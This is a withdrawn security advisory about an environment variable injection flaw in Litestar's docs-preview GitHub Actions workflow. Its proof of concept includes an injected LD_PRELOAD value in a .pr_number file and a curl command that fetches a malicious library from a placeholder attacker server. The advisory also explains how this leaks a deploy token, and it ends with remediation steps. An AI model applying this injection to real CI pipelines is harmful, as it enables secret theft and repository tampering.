summary: |
  Withdrawn Advisory: Litestar has an environment Variable injection in `docs-preview.yml` workflow
  ## Withdrawn Advisory
  This advisory has been withdrawn because the confidentiality, integrity, and availability impacts of the vulnerability affect Litestar's CI/CD environment rather than the `litestar` package. While the information in the advisory is still valid, users of the `litestar` package are not affected and do not need to receive Dependabot alerts.

  ## Original Advisory

  ### Summary
  Litestar's `docs-preview.yml` workflow is vulnerable to Environment Variable injection which may lead to secret exfiltration and repository manipulation.

  ### Environment Variable injection (`GHSL-2024-177`)

  The [`docs-preview.yml` workflow](https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml) gets triggered when the `Tests And Linting` workflow completes:

  ```yaml
  on:
    workflow_run:
      workflows: [Tests And Linting]
      types: [completed]
  ```

  Later, it downloads and extracts an artifact generated by the triggering workflow:

  ```yaml
  - name: Download artifact
  uses: dawidd6/action-download-artifact@v6
  with:
    workflow_conclusion: success
    run_id: ${{ github.event.workflow_run.id }}
    path: docs-preview
    name: docs-preview
  ```

  And reads `docs-preview/.pr_number` into an Environment Variable:

  ```yaml
  - name: Set PR number
    run: echo "PR_NUMBER=$(cat docs-preview/.pr_number)" >> $GITHUB_ENV
  ```

  The `$GITHUB_ENV` pointed file is just a regular file where every `KEY=VALUE` will be used to define a new Environment Variable after the step completes. Since the contents of the `.pr_number` file have not been validated, they may contain new lines that will cause new Environment Variables to be defined.

  An attacker can send a malicious `.pr_number` file with the following content:

  ```txt
  111
  LD_PRELOAD=/home/runner/work/litestar/litestar/inject.so
  ```

  Which will result in two Environment Variables being defined:

  - PR_NUMBER=111
  - LD_PRELOAD=/home/runner/work/litestar/litestar/inject.so

  In this example we are manipulating the `LD_PRELOAD` environment variable to force the system to load a malicious shared library called `inject.so`. As a result, all subsequent processes launched will automatically incorporate this compromised library into their execution environment.

  The following step will run the `JamesIves/github-pages-deploy-action` action which will [run the `node` command](https://github.com/JamesIves/github-pages-deploy-action/blob/2c9a889f39c2410b2ca1342f465a53a7c5c389b4/action.yml#L5). Therefore the `LD_PRELOAD` will execute arbitrary code when `node` gets executed:

  ```yaml
  - name: Deploy docs preview
    uses: JamesIves/github-pages-deploy-action@v4
    with:
      folder: docs-preview/docs/_build/html
      token: ${{ secrets.DOCS_PREVIEW_DEPLOY_TOKEN }}
      repository-name: litestar-org/litestar-docs-preview
      clean: false
      target-folder: ${{ env.PR_NUMBER }}
      branch: gh-pages
  ```

  #### PoC

  - Clone the repository
  - Edit the `ci.yml` workflow.

  ```yaml
  name: Tests And Linting

  on:
    pull_request:

  jobs:
    upload-patch:
      runs-on: ubuntu-latest
      timeout-minutes: 10
      steps:
        - name: Save PR number and payload
          run: |
            make payload
            echo -e "${{ github.event.number }}\nLD_PRELOAD=/home/runner/work/litestar/litestar/inject.so" > payload/.pr_number
            curl http://<ATTACKER SERVER>/inject.so -o payload/inject.so

        - name: Upload artifact
          uses: actions/upload-artifact@v3
          with:
            name: docs-preview
            path: payload
  ```

  - Create a Pull Request with this change.
  - Since the modified workflow is triggered on `pull_request`, the attacker Pull Request will trigger it and upon completion will trigger the vulnerable `Deploy documentation preview` workflow which will read the malicious artifact and pollute the Environment Variables.

  #### Impact

  This issue will grant a malicious actor the [following permissions](https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17):

  ```
    Issues: write
    Metadata: read
    PullRequests: write
  ```

  In addition, the following secret will get exposed to the attacker: `DOCS_PREVIEW_DEPLOY_TOKEN`

  #### Remediation

  - Verify the contents of the downloaded artifacts.
  - Do not allow new lines in the value redirected to GITHUB_ENV
